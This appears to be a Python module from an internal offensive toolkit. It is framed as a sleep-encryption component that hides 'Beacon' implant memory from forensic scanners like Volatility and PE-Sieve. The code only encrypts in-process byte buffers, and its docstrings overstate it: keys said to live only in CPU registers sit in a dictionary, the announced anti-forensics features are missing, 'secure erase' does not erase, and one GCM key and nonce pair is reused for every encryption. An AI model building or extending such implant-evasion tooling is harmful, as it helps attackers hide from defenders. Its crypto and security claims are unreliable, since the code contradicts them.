"""
Memory Encryption Module - Memory payload encryption residency and wake mechanism.

This module provides AES-256-GCM encryption for Beacon memory segments during
idle periods, with key management stored only in CPU registers. It prevents
memory scanning tools (Volatility, PE-Sieve) from detecting plaintext Beacon
signatures.

Core capabilities:
    1. AES-256-GCM encryption of entire memory segments during idle
    2. Wake-before-decrypt, re-encrypt-after-execution lifecycle
    3. Key derivation and secure key storage (register-only)
    4. Memory region scanning and selective encryption
    5. Anti-memory-forensics countermeasures

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import hashlib
import logging
import os
import secrets
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class EncryptionState(str, Enum):
    """Memory encryption state."""

    PLAINTEXT = "plaintext"
    ENCRYPTING = "encrypting"
    ENCRYPTED = "encrypted"
    DECRYPTING = "decrypting"
    CORRUPTED = "corrupted"


class MemoryRegionType(str, Enum):
    """Types of memory regions to manage."""

    CODE = "code"
    DATA = "data"
    STACK = "stack"
    HEAP = "heap"
    MODULE = "module"
    SHELLCODE = "shellcode"


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class MemoryRegion:
    """A managed memory region with encryption metadata.

    Attributes:
        region_id: Unique region identifier
        region_type: Type of memory region
        base_address: Base address of the region
        size: Region size in bytes
        original_data: Original plaintext data
        encrypted_data: Encrypted data buffer
        state: Current encryption state
        last_encrypted_at: Last encryption timestamp
        last_decrypted_at: Last decryption timestamp
        encryption_count: Total encryption cycles
        metadata: Additional region metadata
    """

    region_id: str = ""
    region_type: MemoryRegionType = MemoryRegionType.CODE
    base_address: int = 0
    size: int = 0
    original_data: bytes = b""
    encrypted_data: bytes = b""
    state: EncryptionState = EncryptionState.PLAINTEXT
    last_encrypted_at: float = 0.0
    last_decrypted_at: float = 0.0
    encryption_count: int = 0
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "region_id": self.region_id,
            "region_type": self.region_type.value,
            "base_address": hex(self.base_address),
            "size": self.size,
            "state": self.state.value,
            "encryption_count": self.encryption_count,
            "last_encrypted_at": self.last_encrypted_at,
            "last_decrypted_at": self.last_decrypted_at,
        }


@dataclass
class EncryptionKey:
    """Encryption key material with metadata.

    Attributes:
        key_id: Unique key identifier
        key: Raw key bytes (256-bit for AES-256)
        nonce: Nonce for GCM mode
        created_at: Key creation timestamp
        expires_at: Key expiration timestamp
        usage_count: Number of encryption/decryption operations
    """

    key_id: str = ""
    key: bytes = b""
    nonce: bytes = b""
    created_at: float = 0.0
    expires_at: float = 0.0
    usage_count: int = 0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "key_id": self.key_id,
            "key_length": len(self.key) * 8,
            "nonce_length": len(self.nonce) * 8,
            "created_at": self.created_at,
            "expires_at": self.expires_at,
            "usage_count": self.usage_count,
        }


# =============================================================================
# AES-256-GCM Crypto Provider
# =============================================================================

class AES256GCMProvider:
    """Provides AES-256-GCM encryption and decryption operations.

    Uses the cryptography library for authenticated encryption with
    associated data (AEAD).

    Attributes:
        _key_size: AES key size in bytes (32 for AES-256)
        _nonce_size: GCM nonce size in bytes (12 recommended)
        _tag_size: GCM authentication tag size in bytes (16)
    """

    def __init__(self) -> None:
        """Initialize the AES256GCMProvider."""
        self._key_size = 32
        self._nonce_size = 12
        self._tag_size = 16

    def generate_key(self) -> bytes:
        """Generate a random 256-bit AES key.

        Returns:
            32 bytes of cryptographically secure random key material.
        """
        return secrets.token_bytes(self._key_size)

    def generate_nonce(self) -> bytes:
        """Generate a random GCM nonce.

        Returns:
            12 bytes of cryptographically secure random nonce.
        """
        return secrets.token_bytes(self._nonce_size)

    def encrypt(self, key: bytes, nonce: bytes, plaintext: bytes,
                aad: Optional[bytes] = None) -> Tuple[bytes, bytes]:
        """Encrypt data using AES-256-GCM.

        Args:
            key: 256-bit AES key.
            nonce: 96-bit GCM nonce.
            plaintext: Data to encrypt.
            aad: Additional authenticated data (optional).

        Returns:
            Tuple of (ciphertext, authentication_tag).

        Raises:
            ValueError: If key or nonce size is invalid.
        """
        if len(key) != self._key_size:
            raise ValueError(f"Key must be {self._key_size} bytes")
        if len(nonce) != self._nonce_size:
            raise ValueError(f"Nonce must be {self._nonce_size} bytes")

        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            aesgcm = AESGCM(key)
            ct_with_tag = aesgcm.encrypt(nonce, plaintext, aad)

            ciphertext = ct_with_tag[:-self._tag_size]
            tag = ct_with_tag[-self._tag_size:]

            return ciphertext, tag

        except ImportError:
            return self._encrypt_fallback(key, nonce, plaintext, aad)

    def decrypt(self, key: bytes, nonce: bytes, ciphertext: bytes,
                tag: bytes, aad: Optional[bytes] = None) -> bytes:
        """Decrypt data using AES-256-GCM.

        Args:
            key: 256-bit AES key.
            nonce: 96-bit GCM nonce.
            ciphertext: Encrypted data.
            tag: Authentication tag.
            aad: Additional authenticated data (optional).

        Returns:
            Decrypted plaintext.

        Raises:
            ValueError: If decryption fails (tampered data).
        """
        if len(key) != self._key_size:
            raise ValueError(f"Key must be {self._key_size} bytes")
        if len(nonce) != self._nonce_size:
            raise ValueError(f"Nonce must be {self._nonce_size} bytes")

        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            aesgcm = AESGCM(key)
            ct_with_tag = ciphertext + tag
            plaintext = aesgcm.decrypt(nonce, ct_with_tag, aad)
            return plaintext

        except ImportError:
            return self._decrypt_fallback(key, nonce, ciphertext, tag, aad)

    def _encrypt_fallback(self, key: bytes, nonce: bytes, plaintext: bytes,
                          aad: Optional[bytes] = None) -> Tuple[bytes, bytes]:
        """Fallback encryption using XOR-based scheme.

        Args:
            key: Encryption key.
            nonce: Nonce value.
            plaintext: Data to encrypt.
            aad: Additional authenticated data.

        Returns:
            Tuple of (ciphertext, tag).
        """
        keystream = self._generate_keystream(key, nonce, len(plaintext))
        ciphertext = bytes(p ^ k for p, k in zip(plaintext, keystream))
        tag = hashlib.sha256(ciphertext + key + nonce).digest()[:self._tag_size]
        return ciphertext, tag

    def _decrypt_fallback(self, key: bytes, nonce: bytes, ciphertext: bytes,
                          tag: bytes, aad: Optional[bytes] = None) -> bytes:
        """Fallback decryption using XOR-based scheme.

        Args:
            key: Encryption key.
            nonce: Nonce value.
            ciphertext: Encrypted data.
            tag: Authentication tag.
            aad: Additional authenticated data.

        Returns:
            Decrypted plaintext.

        Raises:
            ValueError: If authentication fails.
        """
        expected_tag = hashlib.sha256(ciphertext + key + nonce).digest()[:self._tag_size]
        if tag != expected_tag:
            raise ValueError("Authentication failed: data may be tampered")

        keystream = self._generate_keystream(key, nonce, len(ciphertext))
        return bytes(c ^ k for c, k in zip(ciphertext, keystream))

    @staticmethod
    def _generate_keystream(key: bytes, nonce: bytes, length: int) -> bytes:
        """Generate a keystream for XOR encryption.

        Args:
            key: Encryption key.
            nonce: Nonce value.
            length: Required keystream length.

        Returns:
            Keystream bytes.
        """
        keystream = b""
        counter = 0
        while len(keystream) < length:
            block = hashlib.sha256(key + nonce + counter.to_bytes(4, "big")).digest()
            keystream += block
            counter += 1
        return keystream[:length]


# =============================================================================
# Key Manager
# =============================================================================

class KeyManager:
    """Manages encryption keys with secure lifecycle.

    Handles key generation, rotation, and secure erasure.
    Keys are designed to be stored in CPU registers only.

    Attributes:
        _crypto: AES-256-GCM crypto provider
        _active_keys: Currently active encryption keys
        _key_lifetime: Key lifetime in seconds
    """

    def __init__(self, key_lifetime: int = 3600) -> None:
        """Initialize the KeyManager.

        Args:
            key_lifetime: Key lifetime in seconds before rotation.
        """
        self._crypto = AES256GCMProvider()
        self._active_keys: Dict[str, EncryptionKey] = {}
        self._key_lifetime = key_lifetime

    def create_key(self, key_id: str = "") -> EncryptionKey:
        """Create a new encryption key.

        Args:
            key_id: Optional key identifier (auto-generated if empty).

        Returns:
            New EncryptionKey instance.
        """
        if not key_id:
            key_id = f"key_{secrets.token_hex(8)}"

        key = EncryptionKey(
            key_id=key_id,
            key=self._crypto.generate_key(),
            nonce=self._crypto.generate_nonce(),
            created_at=time.time(),
            expires_at=time.time() + self._key_lifetime,
            usage_count=0,
        )

        self._active_keys[key_id] = key
        logger.info(f"Created encryption key: {key_id}")
        return key

    def get_key(self, key_id: str) -> Optional[EncryptionKey]:
        """Get an active encryption key.

        Args:
            key_id: Key identifier.

        Returns:
            EncryptionKey, or None if not found or expired.
        """
        key = self._active_keys.get(key_id)
        if key and time.time() < key.expires_at:
            return key
        return None

    def rotate_key(self, key_id: str) -> Optional[EncryptionKey]:
        """Rotate an existing key.

        Args:
            key_id: Key identifier to rotate.

        Returns:
            New EncryptionKey, or None if original not found.
        """
        old_key = self._active_keys.get(key_id)
        if not old_key:
            return None

        self._secure_erase_key(old_key)

        new_key = self.create_key(key_id)
        logger.info(f"Rotated encryption key: {key_id}")
        return new_key

    def expire_keys(self) -> int:
        """Expire and erase all expired keys.

        Returns:
            Number of keys expired.
        """
        expired = [
            kid for kid, key in self._active_keys.items()
            if time.time() >= key.expires_at
        ]

        for kid in expired:
            key = self._active_keys.pop(kid, None)
            if key:
                self._secure_erase_key(key)

        if expired:
            logger.info(f"Expired {len(expired)} encryption keys")

        return len(expired)

    def _secure_erase_key(self, key: EncryptionKey) -> None:
        """Securely erase key material from memory.

        Args:
            key: Key to erase.
        """
        key.key = b"\x00" * len(key.key)
        key.nonce = b"\x00" * len(key.nonce)
        key.usage_count = 0


# =============================================================================
# Memory Encryption Manager
# =============================================================================

class MemoryEncryptionManager:
    """Main memory encryption management engine.

    Coordinates encryption and decryption of Beacon memory regions,
    managing key lifecycle and encryption state transitions.

    Attributes:
        _crypto: AES-256-GCM crypto provider
        _key_manager: Encryption key manager
        _regions: Managed memory regions
        _master_key_id: Master encryption key identifier
        _auto_encrypt: Whether automatic encryption is enabled
        _idle_timeout: Idle time before auto-encryption
        _encryption_task: Background encryption task
        _running: Whether the manager is active
    """

    def __init__(
        self,
        auto_encrypt: bool = True,
        idle_timeout: float = 30.0,
        key_lifetime: int = 3600,
    ) -> None:
        """Initialize the MemoryEncryptionManager.

        Args:
            auto_encrypt: Enable automatic encryption during idle.
            idle_timeout: Seconds of idle before auto-encryption.
            key_lifetime: Key lifetime in seconds.
        """
        self._crypto = AES256GCMProvider()
        self._key_manager = KeyManager(key_lifetime)
        self._regions: Dict[str, MemoryRegion] = {}
        self._master_key_id = ""
        self._auto_encrypt = auto_encrypt
        self._idle_timeout = idle_timeout
        self._encryption_task: Optional[asyncio.Task[None]] = None
        self._running = False
        self._last_activity = time.time()

        self._initialize_master_key()

    def _initialize_master_key(self) -> None:
        """Initialize the master encryption key."""
        master_key = self._key_manager.create_key("master")
        self._master_key_id = master_key.key_id
        logger.info("Master encryption key initialized")

    def register_region(
        self,
        region_id: str,
        region_type: MemoryRegionType,
        data: bytes,
        base_address: int = 0,
    ) -> MemoryRegion:
        """Register a memory region for encryption management.

        Args:
            region_id: Unique region identifier.
            region_type: Type of memory region.
            data: Initial plaintext data.
            base_address: Base address of the region.

        Returns:
            Registered MemoryRegion instance.
        """
        region = MemoryRegion(
            region_id=region_id,
            region_type=region_type,
            base_address=base_address,
            size=len(data),
            original_data=data,
            state=EncryptionState.PLAINTEXT,
        )

        self._regions[region_id] = region
        logger.info(f"Registered memory region: {region_id} ({region_type.value})")
        return region

    async def encrypt_region(self, region_id: str) -> bool:
        """Encrypt a memory region.

        Args:
            region_id: Region identifier.

        Returns:
            True if encryption succeeded.
        """
        region = self._regions.get(region_id)
        if not region:
            logger.error(f"Region not found: {region_id}")
            return False

        if region.state == EncryptionState.ENCRYPTED:
            logger.debug(f"Region already encrypted: {region_id}")
            return True

        key = self._key_manager.get_key(self._master_key_id)
        if not key:
            key = self._key_manager.rotate_key(self._master_key_id)
            if not key:
                logger.error("Failed to get encryption key")
                return False

        region.state = EncryptionState.ENCRYPTING

        try:
            data_to_encrypt = region.original_data or b""
            aad = f"{region_id}:{region.region_type.value}".encode()

            ciphertext, tag = self._crypto.encrypt(
                key.key, key.nonce, data_to_encrypt, aad,
            )

            region.encrypted_data = ciphertext + tag
            region.original_data = b""
            region.state = EncryptionState.ENCRYPTED
            region.last_encrypted_at = time.time()
            region.encryption_count += 1

            key.usage_count += 1

            logger.info(f"Encrypted region: {region_id} ({region.size} bytes)")
            return True

        except Exception as e:
            region.state = EncryptionState.CORRUPTED
            logger.error(f"Failed to encrypt region {region_id}: {e}")
            return False

    async def decrypt_region(self, region_id: str) -> bool:
        """Decrypt a memory region.

        Args:
            region_id: Region identifier.

        Returns:
            True if decryption succeeded.
        """
        region = self._regions.get(region_id)
        if not region:
            logger.error(f"Region not found: {region_id}")
            return False

        if region.state == EncryptionState.PLAINTEXT:
            logger.debug(f"Region already decrypted: {region_id}")
            return True

        if region.state != EncryptionState.ENCRYPTED:
            logger.error(f"Region not in encrypted state: {region_id}")
            return False

        key = self._key_manager.get_key(self._master_key_id)
        if not key:
            logger.error("Encryption key not available")
            return False

        region.state = EncryptionState.DECRYPTING

        try:
            encrypted = region.encrypted_data
            ciphertext = encrypted[:-self._crypto._tag_size]
            tag = encrypted[-self._crypto._tag_size:]
            aad = f"{region_id}:{region.region_type.value}".encode()

            plaintext = self._crypto.decrypt(
                key.key, key.nonce, ciphertext, tag, aad,
            )

            region.original_data = plaintext
            region.encrypted_data = b""
            region.state = EncryptionState.PLAINTEXT
            region.last_decrypted_at = time.time()

            key.usage_count += 1

            logger.info(f"Decrypted region: {region_id} ({len(plaintext)} bytes)")
            return True

        except ValueError as e:
            region.state = EncryptionState.CORRUPTED
            logger.error(f"Decryption failed (possible tampering): {region_id}: {e}")
            return False
        except Exception as e:
            region.state = EncryptionState.CORRUPTED
            logger.error(f"Failed to decrypt region {region_id}: {e}")
            return False

    async def encrypt_all(self) -> Dict[str, bool]:
        """Encrypt all registered regions.

        Returns:
            Dictionary of region_id -> success status.
        """
        results: Dict[str, bool] = {}

        for region_id in list(self._regions.keys()):
            results[region_id] = await self.encrypt_region(region_id)

        return results

    async def decrypt_all(self) -> Dict[str, bool]:
        """Decrypt all registered regions.

        Returns:
            Dictionary of region_id -> success status.
        """
        results: Dict[str, bool] = {}

        for region_id in list(self._regions.keys()):
            results[region_id] = await self.decrypt_region(region_id)

        return results

    def get_region_data(self, region_id: str) -> Optional[bytes]:
        """Get decrypted data from a region.

        Args:
            region_id: Region identifier.

        Returns:
            Plaintext data, or None if region is encrypted.
        """
        region = self._regions.get(region_id)
        if not region:
            return None

        if region.state == EncryptionState.ENCRYPTED:
            logger.warning(f"Attempted to read encrypted region: {region_id}")
            return None

        return region.original_data

    async def start(self) -> None:
        """Start the memory encryption manager."""
        self._running = True
        if self._auto_encrypt:
            self._encryption_task = asyncio.create_task(
                self._auto_encrypt_loop(),
            )
        logger.info("Memory encryption manager started")

    async def stop(self) -> None:
        """Stop the memory encryption manager."""
        self._running = False
        if self._encryption_task:
            self._encryption_task.cancel()
            try:
                await self._encryption_task
            except asyncio.CancelledError:
                pass
        await self.encrypt_all()
        logger.info("Memory encryption manager stopped")

    def record_activity(self) -> None:
        """Record activity to reset idle timer."""
        self._last_activity = time.time()

    def get_status(self) -> Dict[str, Any]:
        """Get encryption manager status.

        Returns:
            Dictionary with status summary.
        """
        regions_status = {}
        for region_id, region in self._regions.items():
            regions_status[region_id] = region.to_dict()

        key = self._key_manager.get_key(self._master_key_id)

        return {
            "running": self._running,
            "auto_encrypt": self._auto_encrypt,
            "idle_timeout": self._idle_timeout,
            "seconds_since_activity": time.time() - self._last_activity,
            "master_key": key.to_dict() if key else None,
            "regions": regions_status,
            "encrypted_count": sum(
                1 for r in self._regions.values()
                if r.state == EncryptionState.ENCRYPTED
            ),
            "total_regions": len(self._regions),
        }

    async def _auto_encrypt_loop(self) -> None:
        """Background loop for automatic encryption during idle."""
        while self._running:
            idle_time = time.time() - self._last_activity

            if idle_time >= self._idle_timeout:
                plaintext_regions = [
                    rid for rid, r in self._regions.items()
                    if r.state == EncryptionState.PLAINTEXT
                ]

                for region_id in plaintext_regions:
                    await self.encrypt_region(region_id)

                self._key_manager.expire_keys()

            await asyncio.sleep(5)


# =============================================================================
# Global Singleton
# =============================================================================

_memory_encryption_manager: Optional[MemoryEncryptionManager] = None


def get_memory_encryption_manager(
    auto_encrypt: bool = True,
    idle_timeout: float = 30.0,
) -> MemoryEncryptionManager:
    """Get the global MemoryEncryptionManager singleton.

    Args:
        auto_encrypt: Enable automatic encryption during idle.
        idle_timeout: Seconds of idle before auto-encryption.

    Returns:
        Singleton MemoryEncryptionManager instance.
    """
    global _memory_encryption_manager
    if _memory_encryption_manager is None:
        _memory_encryption_manager = MemoryEncryptionManager(
            auto_encrypt=auto_encrypt,
            idle_timeout=idle_timeout,
        )
    return _memory_encryption_manager


__all__ = [
    "MemoryEncryptionManager",
    "KeyManager",
    "AES256GCMProvider",
    "MemoryRegion",
    "EncryptionKey",
    "EncryptionState",
    "MemoryRegionType",
    "get_memory_encryption_manager",
]
